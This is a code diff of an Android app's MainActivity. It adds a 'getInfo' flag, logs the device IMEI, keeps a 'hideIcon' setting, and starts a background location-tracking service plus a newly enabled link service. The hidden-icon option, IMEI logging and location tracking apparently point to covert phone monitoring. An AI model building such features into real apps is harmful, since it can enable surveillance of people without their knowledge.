@@ -53,7 +53,7 @@ public class MainActivity extends Activity {
 	File root;
 	File[] fileArray;
 	private String sID;
-	
+
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
@@ -90,12 +90,13 @@ public class MainActivity extends Activity {
 		e.commit();
 
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
-
+		boolean getInfo = sp.getBoolean("getInfo", false);
 		if (!hasVisited) {
 			// проверка на первый запуск
 
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
+			e.putBoolean("getInfo", true);
 			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время
@@ -120,14 +121,10 @@ public class MainActivity extends Activity {
 
 			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
 					"File not found. Show dialog.");
-
-//			if (!hasVisited) {
-				viewIDDialog();
-//			}
-//			start();
+			viewIDDialog();
 		} else {
 			Logging.doLog(LOG_TAG, "not show dialog");
-			
+
 			finish();
 		}
 	}
@@ -155,9 +152,11 @@ public class MainActivity extends Activity {
 				e = sp.edit();
 				e.putString("account", value);
 				e.commit();
-				
-				SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-				Logging.doLog(LOG_TAG, "send start request, imei: ", sp.getString("imei", "imei"));
+
+				SharedPreferences sp = PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext());
+				Logging.doLog(LOG_TAG, "send start request, imei: ",
+						sp.getString("imei", "imei"));
 
 				JSONObject jsonObject = new JSONObject();
 				try {
@@ -168,9 +167,9 @@ public class MainActivity extends Activity {
 					e.printStackTrace();
 				}
 
-//				String str = jsonObject.toString();				
-//				StartRequest sr = new StartRequest(getApplicationContext());
-//				sr.sendRequest(str);
+				// String str = jsonObject.toString();
+				// StartRequest sr = new StartRequest(getApplicationContext());
+				// sr.sendRequest(str);
 				start(); // запуск сервисов
 				finish();
 			}
@@ -216,7 +215,7 @@ public class MainActivity extends Activity {
 					e.commit();
 					// Log.d("ID", sp.getString("ID", "ID"));
 					if (!sp.getString("account", "account").equals("account")) {
-						start(); 
+						start();
 						return true;
 					}
 					break;
@@ -243,7 +242,7 @@ public class MainActivity extends Activity {
 		}
 
 		startService(new Intent(MainActivity.this, LocationTracker.class));
-		// startService(new Intent(MainActivity.this, LinkService.class));
+		startService(new Intent(MainActivity.this, LinkService.class));
 
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
@@ -253,14 +252,5 @@ public class MainActivity extends Activity {
 		// Inflate the menu; this adds items to the action bar if it is present.
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
-	}
-
-	@SuppressLint("SimpleDateFormat")
-	private static String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
 	}
 }
